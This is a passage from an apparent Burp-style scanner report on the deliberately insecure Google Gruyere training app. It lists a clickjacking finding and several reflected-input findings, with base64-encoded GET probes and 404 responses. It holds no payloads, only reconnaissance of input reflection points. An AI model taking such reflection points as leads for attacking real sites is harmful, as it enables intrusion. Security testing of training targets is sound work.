      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUaHUsIDE4IEphbiAyMDE4IDA5OjI3OjQyIEdNVA0KRXhwaXJlczogVGh1LCAxOCBKYW4gMjAxOCAwOTozNzo0MiBHTVQNCkVUYWc6ICIzbThDQmciDQpYLUNsb3VkLVRyYWNlLUNvbnRleHQ6IDMwMjI3M2Q4MTlkNmIyZDQ5YTg3ODE2MTU5NGQ0OWZhDQpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4NClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMTg0DQpBZ2U6IDEwMA0KQ2FjaGUtQ29udHJvbDogcHVibGljLCBtYXgtYWdlPTYwMA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KVXNlci1hZ2VudDogKgpEaXNhbGxvdzogLzAKRGlzYWxsb3c6IC8xCkRpc2FsbG93OiAvMgpEaXNhbGxvdzogLzMKRGlzYWxsb3c6IC80CkRpc2FsbG93OiAvNQpEaXNhbGxvdzogLzYKRGlzYWxsb3c6IC83CkRpc2FsbG93OiAvOApEaXNhbGxvdzogLzkKRGlzYWxsb3c6IC9zdGFydApEaXNhbGxvdzogL3Jlc2V0YnV0dG9uCg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2900905800951348224</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/start]]></path>
    <location><![CDATA[/start]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGFydCBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS9wYXJ0MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGYtOA0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogMzhjYWYzNzhiNWU0N2FhNzVlNTRkNTM1MzY3M2Y5NGUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMjoyOSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogNzU2DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogICAgCiAgPFNUWUxFPgogIGJvZHksIHRoLCB0ZCwgZm9ybSB7CiAgICBmb250LWZhbWlseTogVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZjsKICAgIGZvbnQtc2l6ZTogMTJweDsKICB9CiAgaDEgeyBjb2xvcjogI2RkMDAwMDsgfQogIDwvU1RZTEU+CiAgICA8VElUTEU+U3RhcnQgR3J1eWVyZTwvVElUTEU+CiAgICA8Qk9EWT4KICAgIDxIMT5TdGFydCBHcnV5ZXJlPC9IMT4KICAgIFlvdXIgR3J1eWVyZSBpbnN0YW5jZSBpZCBpcyA0MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYuCgogICAgPGJyPjxicj48c3BhbiBzdHlsZT0iY29sb3I6cmVkIj48Yj5XQVJOSU5HOiBHcnV5ZXJlIGlzIG5vdCBzZWN1cmUuPGJyPgogICAgRG8gbm90IHVwbG9hZCBhbnkgcGVyc29uYWwgb3IgcHJpdmF0ZSBkYXRhLjwvYj48L3NwYW4+CgogICAgPGJyPjxicj5CeSB1c2luZyBHcnV5ZXJlIHlvdSBhZ3JlZSB0byB0aGUKICAgIDxBIGhyZWY9Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vaW50bC9lbi9wb2xpY2llcy90ZXJtcy8iPnRlcm1zIG9mIHNlcnZpY2U8L0E+LgoKICAgIDxIMj48QSBIUkVGPSIvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Ij5SZXN1bWU8L0E+PC9IMj4KICAgIDxIMj48QSBIUkVGPSIvcmVzZXRidXR0b24vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Ij5SZXNldDwvQT48L0gyPgogICAgPC9CT0RZPjwvSFRNTD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4716670653180766208</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/]]></path>
    <location><![CDATA[/static/ [name of an arbitrarily supplied URL parameter]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The name of an arbitrarily supplied URL parameter is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvPzc5NWhuMnB6eDc9MSBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiBhMDU5ZDFhMDg2NDVkOTZkNWQxYmQ2MzZkNWJjNjQ4Nw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOToyOToyMyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDI5Nw0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCjxodG1sPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHRleHQ9IzAwMDAwMCBiZ2NvbG9yPSNmZmZmZmY+CjxoMT5FcnJvcjogTm90IEZvdW5kPC9oMT4KPGgyPlRoZSByZXF1ZXN0ZWQgVVJMIDxjb2RlPi9zdGF0aWMvPzc5NWhuMnB6eDc9MTwvY29kZT4gd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L2gyPgo8aDI+PC9oMj4KPC9ib2R5PjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8436947614824320000</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/cheese_b.png]]></path>
    <location><![CDATA[/static/cheese_b.png [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvY2hlZXNlX2IucG5ncmlncjF4YjJ2NyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiBkNzQwNGUxMzNhZGI0ZTMzZWY0YTUxNWQzZTdhODA4OA0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOToyOTozOSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDMwNg0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCjxodG1sPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHRleHQ9IzAwMDAwMCBiZ2NvbG9yPSNmZmZmZmY+CjxoMT5FcnJvcjogTm90IEZvdW5kPC9oMT4KPGgyPlRoZSByZXF1ZXN0ZWQgVVJMIDxjb2RlPi9zdGF0aWMvY2hlZXNlX2IucG5ncmlncjF4YjJ2NzwvY29kZT4gd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L2gyPgo8aDI+PC9oMj4KPC9ib2R5PjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>56815427816304144</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/cheese_bw.png]]></path>
    <location><![CDATA[/static/cheese_bw.png [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvY2hlZXNlX2J3LnBuZzZvb2VoMXhzZTQgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiAxZjJjMTM0ODg0ZjQ4YzhiNGZiZTcxYmQzNWQzYzAxMw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMDoxNCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDMwNw0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCjxodG1sPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHRleHQ9IzAwMDAwMCBiZ2NvbG9yPSNmZmZmZmY+CjxoMT5FcnJvcjogTm90IEZvdW5kPC9oMT4KPGgyPlRoZSByZXF1ZXN0ZWQgVVJMIDxjb2RlPi9zdGF0aWMvY2hlZXNlX2J3LnBuZzZvb2VoMXhzZTQ8L2NvZGU+IHdhcyBub3QgZm91bmQgb24gdGhpcyBzZXJ2ZXIuPC9oMj4KPGgyPjwvaDI+CjwvYm9keT48L2h0bWw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>899452544422066176</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/cheese_w.png]]></path>
    <location><![CDATA[/static/cheese_w.png [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvY2hlZXNlX3cucG5nNzA5dnlpNmgwYyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiAwOTIxYTYTMyYmRjY2MxMjI0OTlkMjNhNDI2NTA4YjtvPTENCkRhdGU6IFRodSwgMTggSmFuIDIwMTggMDk6Mjk6MzkgR01UDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOA0KU2VydmVyOiBHb29nbGUgRnJvbnRlbmQNCkNvbnRlbnQtTGVuZ3RoOiAzMDYNCkNvbm5lY3Rpb246IGNsb3NlDQoNCgo8aHRtbD48aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCI+Cjx0aXRsZT40MDQgTm90IEZvdW5kPC90aXRsZT4KPC9oZWFkPgo8Ym9keSB0ZXh0PSMwMDAwMDAgYmdjb2xvcj0jZmZmZmZmPgo8aDE+RXJyb3I6IE5vdCBGb3VuZDwvaDE+CjxoMj5UaGUgcmVxdWVzdGVkIFVSTCA8Y29kZT4vc3RhdGljL2NoZWVzZV93LnBuZzcwOXZ5aTZoMGM8L2NvZGU+IHdhcyBub3QgZm91bmQgb24gdGhpcyBzZXJ2ZXIuPC9oMj4KPGgyPjwvaDI+CjwvYm9keT48L2h0bWw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3690284971842652160</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/closed.gif]]></path>
    <location><![CDATA[/static/closed.gif [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvY2xvc2VkLmdpZnM5MTQwMmU3dGggSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiA5MmRmYTViYjVkOWE0Y2U5NDJmODUwMTRiOTYzN2MwMg0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMDoyMCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDMwNA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCjxodG1sPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHRleHQ9IzAwMDAwMCBiZ2NvbG9yPSNmZmZmZmY+CjxoMT5FcnJvcjogTm90IEZvdW5kPC9oMT4KPGgyPlRoZSByZXF1ZXN0ZWQgVVJMIDxjb2RlPi9zdGF0aWMvY2xvc2VkLmdpZnM5MTQwMmU3dGg8L2NvZGU+IHdhcyBub3QgZm91bmQgb24gdGhpcyBzZXJ2ZXIuPC9oMj4KPGgyPjwvaDI+CjwvYm9keT48L2h0bWw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3910667694839342080</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/codeindex]]></path>
    <location><![CDATA[/static/codeindex [name of an arbitrarily supplied URL parameter]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The name of an arbitrarily supplied URL parameter is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvY29kZWluZGV4P2RkdncyeDkyaXc9MSBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiBiOGRhYWU4M2JiMmI5MDk1NTBhNWNkOTVhZjQ3Yjk2OA0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMDowOSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDMwNg0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCjxodG1sPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHRleHQ9IzAwMDAwMCBiZ2NvbG9yPSNmZmZmZmY+CjxoMT5FcnJvcjogTm90IEZvdW5kPC9oMT4KPGgyPlRoZSByZXF1ZXN0ZWQgVVJMIDxjb2RlPi9zdGF0aWMvY29kZWluZGV4P2RkdncyeDkyaXc9MTwvY29kZT4gd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L2gyPgo8aDI+PC9oMj4KPC9ib2R5PjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7510589668872396800</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/codeindex]]></path>
    <location><![CDATA[/static/codeindex [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvY29kZWluZGV4MGkzaGl5ZTN6OCBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
